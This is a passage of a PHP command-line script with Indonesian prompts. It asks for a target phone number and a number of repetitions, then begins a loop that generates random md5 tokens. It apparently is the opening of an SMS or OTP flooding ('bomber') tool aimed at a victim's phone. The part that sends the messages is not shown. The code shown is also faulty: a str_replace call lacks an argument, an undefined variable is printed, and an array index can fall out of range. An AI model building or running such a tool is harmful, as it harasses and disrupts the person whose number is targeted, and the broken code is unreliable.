...
echo "Nomor Target?\nInput : ";
$agung_nomer = trim(fgets(STDIN));
if(strlen($agung_nomer)==11){
	$agung_nomer = str_replace("0","62".$agung_nomer);
}elseif(strlen($agung_nomer)>12){
	$agung_nomer = str_replace("62","0",$agung_nomer);
}
echo "Target: $nomer (y/n)";
$agung_cek = trim(fgets(STDIN));
if($agung_cek=="n") exit("Stopped!\n");
echo "Jumlah?\nInput : ";
$agung_jumlah = trim(fgets(STDIN));
for($agung_a=0;$agung_a<$agung_jumlah;$agung_a++) {
	$agung_rand1 = md5(rand(12345678,98765432));
	$agung_rand2 = md5(rand(12345678,98765432));
	$agung_rand = array($agung_rand1,$agung_rand2);
	$agung_rand3 = md5($agung_rand[rand(1,2)]);
